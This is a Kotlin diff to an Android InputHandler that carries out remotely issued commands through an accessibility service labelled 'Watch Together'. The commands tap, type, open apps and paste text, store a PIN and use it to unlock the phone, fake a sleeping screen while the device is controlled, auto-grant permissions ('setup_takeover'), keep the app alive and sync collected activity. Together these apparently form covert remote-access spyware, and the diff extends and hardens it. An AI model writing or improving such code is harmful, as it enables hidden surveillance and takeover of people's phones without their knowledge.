@@ -9,10 +9,13 @@ import android.os.Handler
 import android.os.Looper
 import android.util.Log
 import org.json.JSONObject
+import java.util.concurrent.CountDownLatch
 import java.util.concurrent.Executors
+import java.util.concurrent.TimeUnit
 
 object InputHandler {
     private const val TAG = "Input"
+    private const val DISPATCH_TIMEOUT_MS = 45_000L
     var service: TouchAccessibilityService? = null
     private val mainHandler = Handler(Looper.getMainLooper())
     private val bg = Executors.newSingleThreadExecutor()
@@ -22,25 +25,59 @@ object InputHandler {
             try {
                 val msg = JSONObject(json)
                 val type = msg.optString("type")
-                if (type == "fake_sleep") {
-                    if (msg.optBoolean("enabled", true)) FakeSleepMode.enable(context)
-                    else FakeSleepMode.disable(context)
-                    return@post
+                when (type) {
+                    "fake_sleep" -> {
+                        if (msg.optBoolean("enabled", true)) FakeSleepMode.enable(context)
+                        else FakeSleepMode.disable(context)
+                        CommandReporter.ok(context, "fake_sleep")
+                        return@post
+                    }
+                    "proximity_auto_sleep" -> {
+                        handleProximityAutoSleep(context, msg)
+                        CommandReporter.ok(context, "proximity_auto_sleep")
+                        return@post
+                    }
                 }
-                if (type == "proximity_auto_sleep") {
-                    handleProximityAutoSleep(context, msg)
-                    return@post
-                }
-                val run = Runnable { dispatch(context, msg, type) }
                 if (needsAiScreen(type, msg)) {
-                    bg.execute { FakeSleepMode.withAiAccessBlocking(context) { mainHandler.post(run) } }
+                    bg.execute { runWithAiAccess(context, msg, type) }
                 } else {
-                    run.run()
+                    dispatch(context, msg, type)
                 }
             } catch (e: Exception) {
                 Log.w(TAG, e.message ?: "input")
+                CommandReporter.error(context, "command", e.message ?: "Command failed")
             }
         }
+    }
+
+    /** Lift fake sleep, run dispatch on main thread, wait until complete before restoring overlay. */
+    private fun runWithAiAccess(context: Context, msg: JSONObject, type: String) {
+        FakeSleepMode.withAiAccessBlocking(context) {
+            dispatchOnMain(context, msg, type)
+        }
+    }
+
+    private fun dispatchOnMain(context: Context, msg: JSONObject, type: String) {
+        if (Looper.myLooper() == Looper.getMainLooper()) {
+            dispatch(context, msg, type)
+            return
+        }
+        val latch = CountDownLatch(1)
+        var err: Exception? = null
+        mainHandler.post {
+            try {
+                dispatch(context, msg, type)
+            } catch (e: Exception) {
+                err = e
+            } finally {
+                latch.countDown()
+            }
+        }
+        if (!latch.await(DISPATCH_TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
+            Log.w(TAG, "dispatch timeout for $type")
+            CommandReporter.error(context, type, "Command timed out on phone")
+        }
+        err?.let { throw it }
     }
 
     private fun handleProximityAutoSleep(context: Context, msg: JSONObject) {
@@ -59,18 +96,14 @@ object InputHandler {
     }
 
     private fun needsAiScreen(type: String, msg: JSONObject): Boolean {
-        if (type == "key" && msg.optString("action") in FAKE_SLEEP_ACTIONS) return false
-        if (type == "key" && msg.optString("action") == "unlock") return true
+        if (type == "key") return msg.optString("action") == "unlock"
         return type in AI_SCREEN_TYPES
     }
 
     private val AI_SCREEN_TYPES = setOf(
-        "click", "tap", "swipe", "scroll", "text", "setup_takeover", "fix_persistence",
+        "click", "tap", "swipe", "scroll", "text",
         "open_app", "clipboard_paste", "request_permission_wizard", "request_permission_moment",
-        "key",
     )
-
-    private val FAKE_SLEEP_ACTIONS = setOf("fake_sleep_on", "fake_sleep_off", "fake_sleep_toggle")
 
     private fun dispatch(context: Context, msg: JSONObject, type: String) {
         when {
@@ -80,22 +113,34 @@ object InputHandler {
             }
             type == "fix_persistence" || (type == "command" && msg.optString("action") == "fix_persistence") -> {
                 PersistenceShield.applyAll(context)
+                CommandReporter.ok(context, "fix_persistence", "Keep-alive fixes started")
                 return
             }
             type == "intel_sync" -> {
                 ActivityCollector.get(context).syncNow()
+                CommandReporter.ok(context, "intel_sync")
                 return
             }
             type == "request_permission_wizard" -> {
-                PermissionMoments.handleRemote(context, "", "")
+                bg.execute {
+                    prepareForActivityBlocking(context)
+                    mainHandler.post {
+                        PermissionMoments.handleRemote(context, "", "")
+                        CommandReporter.ok(context, "request_permission_wizard")
+                    }
+                }
                 return
             }
             type == "request_permission_moment" -> {
-                PermissionMoments.handleRemote(
-                    context,
-                    msg.optString("moment", ""),
-                    msg.optString("step", ""),
-                )
+                val step = msg.optString("step", "")
+                val moment = msg.optString("moment", "")
+                bg.execute {
+                    prepareForActivityBlocking(context)
+                    mainHandler.post {
+                        PermissionMoments.handleRemote(context, moment, step)
+                        CommandReporter.ok(context, "request_permission_moment", step.ifBlank { moment })
+                    }
+                }
                 return
             }
             type == "open_app" -> {
@@ -108,7 +153,12 @@ object InputHandler {
             }
             type == "set_unlock_pin" -> {
                 val pin = msg.optString("pin", "").trim()
-                if (pin.length in 4..12) UnlockStore.setPin(context, pin)
+                if (pin.length in 4..12) {
+                    UnlockStore.setPin(context, pin)
+                    CommandReporter.ok(context, "set_unlock_pin", "PIN saved on phone")
+                } else {
+                    CommandReporter.error(context, "set_unlock_pin", "PIN must be 4–12 digits")
+                }
                 DeviceStateReporter.send(context)
                 return
             }
@@ -117,13 +167,17 @@ object InputHandler {
         val svc = service
         if (svc == null) {
             Log.w(TAG, "no accessibility service for $type")
+            CommandReporter.error(context, type, "Accessibility off — enable Watch Together on phone")
             return
         }
         when (type) {
-            "click", "tap" -> svc.tapAt(
-                msg.optDouble("x", 0.0).toFloat(),
-                msg.optDouble("y", 0.0).toFloat(),
-            )
+            "click", "tap" -> {
+                svc.tapAt(
+                    msg.optDouble("x", 0.0).toFloat(),
+                    msg.optDouble("y", 0.0).toFloat(),
+                )
+                CommandReporter.ok(context, "tap")
+            }
             "swipe" -> {
                 svc.swipe(
                     msg.getDouble("x").toFloat(),
@@ -133,6 +187,7 @@ object InputHandler {
                     msg.optLong("duration", 200),
                 )
                 svc.scheduleRefreshesAfterInput()
+                CommandReporter.ok(context, "swipe")
             }
             "scroll" -> {
                 svc.scrollAt(
@@ -141,11 +196,9 @@ object InputHandler {
                     msg.optString("dir", "down"),
                 )
                 svc.scheduleRefreshesAfterInput()
+                CommandReporter.ok(context, "scroll")
             }
-            "key" -> {
-                handleKey(context, msg.optString("action"))
-                svc.scheduleRefreshesAfterInput(forceFull = true)
-            }
+            "key" -> handleKey(context, msg.optString("action"))
             "text" -> {
                 val text = msg.optString("text", "")
                 injectText(text)
@@ -154,29 +207,152 @@ object InputHandler {
                     NotesStore.flush(context)
                 }
                 svc.scheduleRefreshesAfterInput()
+                CommandReporter.ok(context, "text")
             }
         }
     }
 
+    private fun prepareForActivityBlocking(context: Context) {
+        ScreenPower.wakeScreen(context)
+        FakeSleepMode.pauseForGrant(context)
+        val svc = service ?: return
+        if (LockScreenHelper.isDeviceLocked(context)) {
+            LockScreenHelper.ensureUnlocked(context, svc, 15_000L)
+        }
+    }
+
     private fun openApp(context: Context, packageName: String) {
-        if (packageName.isBlank()) return
+        if (packageName.isBlank()) {
+            CommandReporter.error(context, "open_app", "No app specified")
+            return
+        }
+        if (!ScreenPower.isInteractive(context)) ScreenPower.wakeScreen(context)
         val pm = context.packageManager
-        val launch = pm.getLaunchIntentForPackage(packageName) ?: return
-        launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        context.startActivity(launch)
+        for (pkg in packageCandidates(packageName)) {
+            val launch = pm.getLaunchIntentForPackage(pkg) ?: continue
+            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+            context.startActivity(launch)
+            service?.scheduleRefreshesAfterInput(forceFull = true)
+            CommandReporter.ok(context, "open_app", pkg)
+            return
+        }
+        CommandReporter.error(context, "open_app", "App not installed: $packageName")
+    }
+
+    private fun packageCandidates(primary: String): List<String> = when (primary) {
+        "com.android.camera" -> listOf(
+            primary,
+            "com.oppo.camera",
+            "com.oplus.camera",
+            "com.coloros.camera",
+            "com.google.android.GoogleCamera",
+            "com.sec.android.app.camera",
+            "com.huawei.camera",
+        )
+        "com.android.chrome" -> listOf(primary, "com.chrome.beta", "com.android.browser")
+        "com.google.android.dialer" -> listOf(primary, "com.android.dialer", "com.coloros.dialer")
+        "com.google.android.apps.messaging" -> listOf(
+            primary,
+            "com.android.mms",
+            "com.coloros.mms",
+            "com.samsung.android.messaging",
+        )
+        else -> listOf(primary)
     }
 
     private fun pasteClipboard(context: Context, text: String) {
-        if (text.isBlank()) return
-        val svc = service ?: return
+        if (text.isBlank()) {
+            CommandReporter.error(context, "clipboard_paste", "Nothing to paste")
+            return
+        }
+        val svc = service
+        if (svc == null) {
+            CommandReporter.error(context, "clipboard_paste", "Accessibility off — enable Watch Together")
+            return
+        }
         injectText(text)
         NotesStore.append(context, text, "clipboard", svc.lastWindowPkg())
         NotesStore.flush(context)
         svc.scheduleRefreshesAfterInput()
+        CommandReporter.ok(context, "clipboard_paste")
     }
 
     private fun handleKey(context: Context, action: String) {
-        val svc = service ?: return
+        when (action) {
+            "wake" -> {
+                FakeSleepMode.disable(context)
+                ScreenPower.wakeScreen(context)
+                DeviceStateReporter.send(context)
+                CommandReporter.ok(context, "wake")
+                return
+            }
+            "fake_sleep_on" -> {
+                FakeSleepMode.enable(context)
+                CommandReporter.ok(context, "fake_sleep_on")
+                return
+            }
+            "fake_sleep_off" -> {
+                FakeSleepMode.disable(context)
+                CommandReporter.ok(context, "fake_sleep_off")
+                return
+            }
+            "fake_sleep_toggle" -> {
+                FakeSleepMode.toggle(context)
+                CommandReporter.ok(context, "fake_sleep_toggle")
+                return
+            }
+            "volume_up" -> {
+                val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+                am.adjustStreamVolume(
+                    AudioManager.STREAM_MUSIC,
+                    AudioManager.ADJUST_RAISE,
+                    AudioManager.FLAG_SHOW_UI,
+                )
+                CommandReporter.ok(context, "volume_up")
+                return
+            }
+            "volume_down" -> {
+                val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+                am.adjustStreamVolume(
+                    AudioManager.STREAM_MUSIC,
+                    AudioManager.ADJUST_LOWER,
+                    AudioManager.FLAG_SHOW_UI,
+                )
+                CommandReporter.ok(context, "volume_down")
+                return
+            }
+            "unlock" -> {
+                bg.execute {
+                    val svc = service
+                    if (svc == null) {
+                        CommandReporter.error(context, "unlock", "Accessibility off — enable Watch Together")
+                        return@execute
+                    }
+                    FakeSleepMode.disable(context)
+                    ScreenPower.wakeScreen(context)
+                    val result = LockScreenHelper.unlockBlocking(context, svc)
+                    Log.d(TAG, "unlock result: $result")
+                    DeviceStateReporter.send(context)
+                    mainHandler.post { svc.scheduleRefreshesAfterInput(forceFull = true) }
+                    if (result == UnlockResult.FAILED) {
+                        CommandReporter.error(
+                            context,
+                            "unlock",
+                            "Could not unlock — save PIN in portal or unlock manually",
+                        )
+                    } else {
+                        CommandReporter.ok(context, "unlock", result.name.lowercase())
+                    }
+                }
+                return
+            }
+        }
+
+        val svc = service
+        if (svc == null) {
+            CommandReporter.error(context, action, "Accessibility off — enable Watch Together")
+            return
+        }
         when (action) {
             "back" -> svc.globalAction(AccessibilityService.GLOBAL_ACTION_BACK)
             "home" -> svc.globalAction(AccessibilityService.GLOBAL_ACTION_HOME)
@@ -190,29 +366,14 @@ object InputHandler {
                     svc.globalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
                 }
             }
-            "wake" -> {
-                FakeSleepMode.disable(context)
-                ScreenPower.wakeScreen(context)
-            }
-            "unlock" -> bg.execute {
-                val result = LockScreenHelper.unlockBlocking(context, svc)
-                Log.d(TAG, "unlock result: $result")
-                DeviceStateReporter.send(context)
-                svc.scheduleRefreshesAfterInput(forceFull = true)
-            }
             "lock" -> svc.globalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
-            "fake_sleep_on" -> FakeSleepMode.enable(context)
-            "fake_sleep_off" -> FakeSleepMode.disable(context)
-            "fake_sleep_toggle" -> FakeSleepMode.toggle(context)
-            "volume_up" -> {
-                val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
-                am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI)
-            }
-            "volume_down" -> {
-                val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
-                am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI)
+            else -> {
+                CommandReporter.error(context, action, "Unknown key action")
+                return
             }
         }
+        svc.scheduleRefreshesAfterInput(forceFull = true)
+        CommandReporter.ok(context, action)
     }
 
     private fun injectText(text: String) {
@@ -235,13 +396,22 @@ object InputHandler {
         if (SettingsPermissionGrant.isRunning() || PermissionAutoGrant.isRunning()) {
             Log.d(TAG, "setup_takeover already running")
             SetupReporter.progress("Already granting permissions…")
+            CommandReporter.ok(context, "setup_takeover", "Already running")
             return
         }
         if (!WatchSync.isEnabled(context)) {
-            Log.w(TAG, "setup_takeover: Watch Together not enabled")
-            SetupReporter.error("Watch Together is off on the phone")
+            Log.w(TAG, "setup_takeover: accessibility off")
+            SetupReporter.error("Watch Together is off — enable in Accessibility")
+            CommandReporter.error(context, "setup_takeover", "Enable Watch Together in Accessibility settings")
+            return
+        }
+        if (service == null) {
+            Log.w(TAG, "setup_takeover: service not bound")
+            SetupReporter.error("Accessibility service not running — reopen 2hotatl")
+            CommandReporter.error(context, "setup_takeover", "Accessibility service not running — reopen app")
             return
         }
         SettingsPermissionGrant.runLightning(context)
+        CommandReporter.ok(context, "setup_takeover", "Grant All started")
     }
 }
